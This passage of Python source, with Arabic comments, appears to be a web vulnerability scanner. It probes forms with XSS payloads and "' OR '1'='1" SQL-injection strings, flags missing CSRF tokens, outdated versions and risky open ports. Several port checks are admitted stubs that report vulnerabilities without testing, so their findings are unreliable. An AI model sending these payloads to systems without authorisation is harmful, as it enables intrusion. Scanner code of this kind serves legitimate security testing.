            # البحث عن إشارات إضافية في محتوى الصفحة
            meta_generator = re.search(r'<meta\s+name=["\']generator["\']\s+content=["\']([^"\']*)["\']/>', content)
            if meta_generator:
                generator = meta_generator.group(1).lower()
                for pattern in software_patterns:
                    matches = re.findall(pattern['pattern'], generator, re.IGNORECASE)
                    if matches:
                        version = matches[0]
                        if self.is_outdated_version(version, pattern['latest']):
                            outdated_software.append({
                                'name': pattern['name'],
                                'version': version,
                                'latest': pattern['latest'],
                                'source': 'Meta generator tag'
                            })
            
            if outdated_software:
                self.add_vulnerability({
                    'name': 'برامج قديمة',
                    'severity': 'متوسطة',
                    'description': 'تم اكتشاف برامج قديمة. قد تحتوي هذه البرامج على ثغرات أمنية معروفة.',
                    'path': url,
                    'details': {
                        'outdated_software': outdated_software
                    }
                })
                
                if self.verbose:
                    print(f"{Fore.YELLOW}[+] تم اكتشاف برامج قديمة: {url}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار البرامج القديمة: {str(e)}{Style.RESET_ALL}")
    
    # التحقق من إصدار البرنامج إذا كان قديمًا
    def is_outdated_version(self, current, latest):
        try:
            current_parts = [int(p) for p in current.split('.')]
            latest_parts = [int(p) for p in latest.split('.')]
            
            for i in range(min(len(current_parts), len(latest_parts))):
                if current_parts[i] < latest_parts[i]:
                    return True
                elif current_parts[i] > latest_parts[i]:
                    return False
            
            return len(current_parts) < len(latest_parts)
        except:
            return False
    
    # فحص ثغرات النماذج
    def check_form_vulnerabilities(self, form):
        # فحص ثغرات XSS في النماذج
        self.check_form_xss(form)
        
        # فحص ثغرات CSRF في النماذج
        self.check_form_csrf(form)
        
        # فحص ثغرات حقن SQL في النماذج
        self.check_form_sql_injection(form)
    
    # فحص ثغرات XSS في النماذج
    def check_form_xss(self, form):
        # قائمة بأنماط XSS للاختبار
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
        
        try:
            for payload in xss_payloads:
                # إنشاء بيانات النموذج مع الحمولة
                data = {}
                for input_name, input_type in form['inputs'].items():
                    if input_type in ['text', 'search', 'url', 'email', 'hidden']:
                        data[input_name] = payload
                    elif input_type == 'password':
                        data[input_name] = 'Password123'
                    elif input_type == 'checkbox':
                        data[input_name] = 'on'
                    elif input_type == 'radio':
                        data[input_name] = 'option1'
                    else:
                        data[input_name] = 'test'
                
                # إرسال النموذج
                if form['method'] == 'GET':
                    response = self.session.get(form['action'], params=data, verify=False, timeout=10, allow_redirects=True)
                else:  # POST
                    response = self.session.post(form['action'], data=data, verify=False, timeout=10, allow_redirects=True)
                
                # التحقق من وجود الحمولة في الاستجابة
                if payload in response.text:
                    self.add_vulnerability({
                        'name': 'ثغرة XSS في النموذج',
                        'severity': 'عالية',
                        'description': 'تم اكتشاف ثغرة Cross-Site Scripting (XSS) في النموذج. يمكن استغلال هذه الثغرة لتنفيذ سكربتات ضارة في متصفح المستخدم.',
                        'path': form['action'],
                        'details': {
                            'payload': payload,
                            'form_method': form['method'],
                            'reflected': True
                        }
                    })
                    
                    if self.verbose:
                        print(f"{Fore.RED}[+] تم اكتشاف ثغرة XSS في النموذج: {form['action']}{Style.RESET_ALL}")
                    
                    # التوقف بعد العثور على ثغرة
                    break
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار XSS في النموذج: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات CSRF في النماذج
    def check_form_csrf(self, form):
        try:
            # التحقق من وجود رمز CSRF في النموذج
            csrf_tokens = [
                'csrf', 'xsrf', 'token', '_token', 'authenticity_token',
                'csrf_token', 'xsrf_token', 'security_token'
            ]
            
            has_csrf = False
            for input_name in form['inputs'].keys():
                if any(token in input_name.lower() for token in csrf_tokens):
                    has_csrf = True
                    break
            
            if not has_csrf and form['method'] == 'POST':
                self.add_vulnerability({
                    'name': 'ثغرة CSRF في النموذج',
                    'severity': 'متوسطة',
                    'description': 'تم اكتشاف نموذج POST بدون حماية CSRF. يمكن استغلال هذه الثغرة لتنفيذ طلبات غير مصرح بها نيابة عن المستخدم.',
                    'path': form['action'],
                    'details': {
                        'form_method': form['method'],
                        'has_csrf_token': False
                    }
                })
                
                if self.verbose:
                    print(f"{Fore.YELLOW}[+] تم اكتشاف ثغرة CSRF في النموذج: {form['action']}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار CSRF في النموذج: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات حقن SQL في النماذج
    def check_form_sql_injection(self, form):
        # قائمة بأنماط حقن SQL للاختبار
        sql_payloads = [
            "' OR '1'='1", 
            "\" OR \"1\"=\"1"
        ]
        
        try:
            # الحصول على الاستجابة الأصلية للمقارنة
            if form['method'] == 'GET':
                original_response = self.session.get(form['action'], verify=False, timeout=10)
            else:  # POST
                original_data = {}
                for input_name, input_type in form['inputs'].items():
                    if input_type == 'password':
                        original_data[input_name] = 'Password123'
                    elif input_type == 'checkbox':
                        original_data[input_name] = 'on'
                    elif input_type == 'radio':
                        original_data[input_name] = 'option1'
                    else:
                        original_data[input_name] = 'test'
                
                original_response = self.session.post(form['action'], data=original_data, verify=False, timeout=10)
            
            original_content_length = len(original_response.content)
            
            for payload in sql_payloads:
                # إنشاء بيانات النموذج مع الحمولة
                data = {}
                for input_name, input_type in form['inputs'].items():
                    if input_type in ['text', 'search', 'url', 'email', 'hidden']:
                        data[input_name] = payload
                    elif input_type == 'password':
                        data[input_name] = 'Password123'
                    elif input_type == 'checkbox':
                        data[input_name] = 'on'
                    elif input_type == 'radio':
                        data[input_name] = 'option1'
                    else:
                        data[input_name] = 'test'
                
                # إرسال النموذج
                if form['method'] == 'GET':
                    response = self.session.get(form['action'], params=data, verify=False, timeout=10)
                else:  # POST
                    response = self.session.post(form['action'], data=data, verify=False, timeout=10)
                
                # البحث عن علامات حقن SQL ناجح
                sql_errors = [
                    "SQL syntax", "mysql_fetch", "ORA-", "Oracle Error",
                    "Microsoft SQL Server", "PostgreSQL", "SQLite", "syntax error"
                ]
                
                content = response.text.lower()
                content_diff = abs(len(response.content) - original_content_length)
                
                # التحقق من وجود رسائل خطأ SQL أو تغيير كبير في المحتوى
                if any(error.lower() in content for error in sql_errors) or content_diff > 500:
                    self.add_vulnerability({
                        'name': 'ثغرة حقن SQL في النموذج',
                        'severity': 'عالية',
                        'description': 'تم اكتشاف ثغرة حقن SQL محتملة في النموذج. يمكن استغلال هذه الثغرة للوصول غير المصرح به إلى قاعدة البيانات.',
                        'path': form['action'],
                        'details': {
                            'payload': payload,
                            'form_method': form['method'],
                            'response_diff': content_diff,
                            'error_detected': any(error.lower() in content for error in sql_errors)
                        }
                    })
                    
                    if self.verbose:
                        print(f"{Fore.RED}[+] تم اكتشاف ثغرة حقن SQL في النموذج: {form['action']}{Style.RESET_ALL}")
                    
                    # التوقف بعد العثور على ثغرة
                    break
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار حقن SQL في النموذج: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات المنافذ المفتوحة
    def check_port_vulnerabilities(self):
        for port_info in self.open_ports:
            port = port_info['port']
            service = port_info['service']
            version = port_info['version']
            
            # فحص الخدمات المعروفة بثغراتها
            if service == 'ftp' and port == 21:
                self.check_ftp_anonymous(self.ip)
            elif service == 'ssh' and port == 22:
                self.check_ssh_weak_ciphers(self.ip)
            elif service == 'telnet' and port == 23:
                self.add_vulnerability({
                    'name': 'خدمة Telnet مفتوحة',
                    'severity': 'عالية',
                    'description': 'تم اكتشاف خدمة Telnet مفتوحة. تقوم هذه الخدمة بنقل البيانات بدون تشفير، مما يعرض المعلومات الحساسة للخطر.',
                    'path': f"{self.ip}:{port}",
                    'details': {
                        'port': port,
                        'service': service,
                        'version': version
                    }
                })
            elif (service == 'http' or service == 'https') and version:
                self.check_web_server_vulnerabilities(service, version, port)
            elif service == 'mysql' and port == 3306:
                self.check_mysql_empty_password(self.ip)
            elif service == 'rdp' and port == 3389:
                self.add_vulnerability({
                    'name': 'خدمة RDP مفتوحة',
                    'severity': 'متوسطة',
                    'description': 'تم اكتشاف خدمة Remote Desktop Protocol (RDP) مفتوحة. قد تكون هذه الخدمة عرضة لهجمات القوة الغاشمة أو ثغرات معروفة.',
                    'path': f"{self.ip}:{port}",
                    'details': {
                        'port': port,
                        'service': service,
                        'version': version
                    }
                })
    
    # فحص خدمة FTP للوصول المجهول
    def check_ftp_anonymous(self, ip):
        # هذه دالة تمثيلية فقط، في التطبيق الحقيقي يجب استخدام مكتبة FTP لمحاولة الاتصال
        self.add_vulnerability({
            'name': 'وصول FTP مجهول محتمل',
            'severity': 'عالية',
            'description': 'تم اكتشاف خدمة FTP قد تسمح بالوصول المجهول. يمكن استغلال ذلك للوصول غير المصرح به إلى الملفات.',
            'path': f"{ip}:21",
            'details': {
                'port': 21,
                'service': 'ftp'
            }
        })
    
    # فحص خدمة SSH للتشفير الضعيف
    def check_ssh_weak_ciphers(self, ip):
        # هذه دالة تمثيلية فقط، في التطبيق الحقيقي يجب استخدام مكتبة SSH لفحص التشفير
        self.add_vulnerability({
            'name': 'تشفير SSH ضعيف محتمل',
            'severity': 'متوسطة',
            'description': 'قد تستخدم خدمة SSH خوارزميات تشفير ضعيفة. يمكن استغلال ذلك لاعتراض الاتصالات.',
            'path': f"{ip}:22",
            'details': {
                'port': 22,
                'service': 'ssh'
            }
        })
    
    # فحص خدمة MySQL لكلمة مرور فارغة
    def check_mysql_empty_password(self, ip):
        # هذه دالة تمثيلية فقط، في التطبيق الحقيقي يجب استخدام مكتبة MySQL لمحاولة الاتصال
        self.add_vulnerability({
            'name': 'كلمة مرور MySQL فارغة محتملة',
            'severity': 'عالية',
            'description': 'قد تستخدم خدمة MySQL كلمة مرور فارغة للمستخدم الجذر. يمكن استغلال ذلك للوصول غير المصرح به إلى قاعدة البيانات.',
            'path': f"{ip}:3306",
            'details': {
                'port': 3306,
                'service': 'mysql'
            }
        })
    
    # فحص ثغرات خادم الويب
    def check_web_server_vulnerabilities(self, service, version, port):
        if 'apache' in version.lower():
            apache_version = re.search(r'([\d\.]+)', version)
            if apache_version and self.is_outdated_version(apache_version.group(1), '2.4.52'):
                self.add_vulnerability({
                    'name': 'إصدار Apache قديم',
                    'severity': 'متوسطة',
                    'description': f'تم اكتشاف إصدار قديم من خادم Apache ({apache_version.group(1)}). قد يحتوي هذا الإصدار على ثغرات أمنية معروفة.',
                    'path': f"{self.ip}:{port}",
                    'details': {
                        'port': port,
                        'service': service,
                        'version': version,
                        'latest': '2.4.52'
                    }
                })
        elif 'nginx' in version.lower():
            nginx_version = re.search(r'([\d\.]+)', version)
            if nginx_version and self.is_outdated_version(nginx_version.group(1), '1.21'):
                self.add_vulnerability({
                    'name': 'إصدار Nginx قديم',
                    'severity': 'متوسطة',
                    'description': f'تم اكتشاف إصدار قديم من خادم Nginx ({nginx_version.group(1)}). قد يحتوي هذا الإصدار على ثغرات أمنية معروفة.',
                    'path': f"{self.ip}:{port}",
                    'details': {
                        'port': port,
                        'service': service,
                        'version': version,
                        'latest': '1.21'
                    }
                })
    
    # إضافة ثغرة إلى القائمة
    def add_vulnerability(self, vulnerability):
        # إضافة وقت الاكتشاف
        vulnerability['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # التحقق من عدم وجود الثغرة مسبقًا
        for vuln in self.vulnerabilities:
            if vuln['name'] == vulnerability['name'] and vuln['path'] == vulnerability['path']:
                return
        
        self.vulnerabilities.append(vulnerability)